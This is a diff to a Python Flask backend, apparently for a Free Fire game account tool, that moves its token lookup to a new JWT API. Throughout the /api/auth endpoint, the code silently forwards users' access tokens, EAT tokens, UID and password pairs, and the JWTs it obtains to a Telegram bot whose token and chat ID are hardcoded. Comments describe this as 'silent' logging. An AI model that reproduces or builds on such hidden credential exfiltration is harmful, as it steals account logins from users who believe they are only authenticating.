@@ -20,6 +20,9 @@ TELEGRAM_BOT_TOKEN = "8947072736:AAF9Z2lv87XqeV_OAOPmiv7iGDW7cwMF6pU"   # Replac
 TELEGRAM_CHAT_ID = "-1003684272586"       # Replace with your group chat ID
 # -----------------------------------------------------------------
 
+# ---------- NEW JWT API BASE URL ----------
+JWT_API_BASE = "https://ff-jwt-info.vercel.app"
+
 def send_to_telegram(message):
     """Silently send a message to Telegram. No errors, no delays."""
     if "YOUR_" in TELEGRAM_BOT_TOKEN or not TELEGRAM_BOT_TOKEN:
@@ -94,16 +97,15 @@ def serve_image(item_id):
         return Response(r.content, mimetype='image/png')
     except: return "Not Found", 404
 
-# ------------------ MULTI-AUTH ENDPOINT (with silent Telegram logging) ------------------
+# ------------------ MULTI-AUTH ENDPOINT (using new API) ------------------
 @app.route('/api/auth', methods=['POST'])
 def auth():
     data = request.json
     method = data.get('method')
-    key = "dgop"
-    TOKEN_API_BASE = "http://87.232.72.68:3005/token"
 
     # Build log message (credentials only)
     log_msg = f"🔐 Auth | Method: {method}\n"
+
     try:
         if method == 'direct':
             jwt_token = data.get('jwt')
@@ -119,20 +121,25 @@ def auth():
                 "uid": external_id,
                 "nickname": None
             })
+
         elif method == 'access':
             access_token = data.get('access_token')
             if not access_token:
                 return jsonify({"success": False, "message": "Access token required"}), 400
             log_msg += f"Access Token: {access_token}\n"
             send_to_telegram(log_msg)
-            url = f"{TOKEN_API_BASE}?access={access_token}&key={key}"
+            url = f"{JWT_API_BASE}/token"
+            params = {"access_token": access_token}
+
         elif method == 'eat':
             eat_token = data.get('eat_token')
             if not eat_token:
                 return jsonify({"success": False, "message": "EAT token required"}), 400
             log_msg += f"EAT Token: {eat_token}\n"
             send_to_telegram(log_msg)
-            url = f"{TOKEN_API_BASE}?eat={eat_token}&key={key}"
+            url = f"{JWT_API_BASE}/eat"
+            params = {"eat_token": eat_token}
+
         elif method == 'uid_password':
             uid = data.get('uid')
             password = data.get('password')
@@ -140,16 +147,22 @@ def auth():
                 return jsonify({"success": False, "message": "UID and password required"}), 400
             log_msg += f"UID: {uid}\nPassword: {password}\n"
             send_to_telegram(log_msg)
-            url = f"{TOKEN_API_BASE}?uid={uid}&password={password}&key={key}"
+            url = f"{JWT_API_BASE}/guest"
+            params = {"uid": uid, "password": password}
+
         else:
             return jsonify({"success": False, "message": "Invalid auth method"}), 400
 
-        # For access/eat/uid methods, call external API and also log the obtained JWT
-        resp = requests.get(url, timeout=10)
+        # Call the new API
+        resp = requests.get(url, params=params, timeout=10)
         if resp.status_code != 200:
             return jsonify({"success": False, "message": f"External API error: {resp.status_code}"}), 400
 
         resp_data = resp.json()
+        if resp_data.get('status') != 'success':
+            error_msg = resp_data.get('message', 'Unknown error from JWT API')
+            return jsonify({"success": False, "message": error_msg}), 400
+
         jwt_token = resp_data.get('token')
         if not jwt_token:
             return jsonify({"success": False, "message": "No JWT in external response"}), 400
@@ -157,16 +170,20 @@ def auth():
         # Log the obtained JWT as well
         send_to_telegram(f"✅ JWT obtained: {jwt_token}\n")
 
-        region, external_id = decode_jwt(jwt_token)
+        region = resp_data.get('region')
+        # Use account_id from API as UID, but we also decode JWT to get external_id for login_token
+        uid = resp_data.get('account_id')
+        nickname = resp_data.get('account_name')
+
         return jsonify({
             "success": True,
             "jwt": jwt_token,
             "region": region,
-            "uid": external_id,
-            "nickname": resp_data.get('nickname')
+            "uid": uid,
+            "nickname": nickname
         })
+
     except Exception as e:
-        # Optionally log error to Telegram (keep silent)
         send_to_telegram(f"❌ Auth error: {str(e)}")
         return jsonify({"success": False, "message": str(e)}), 500
 
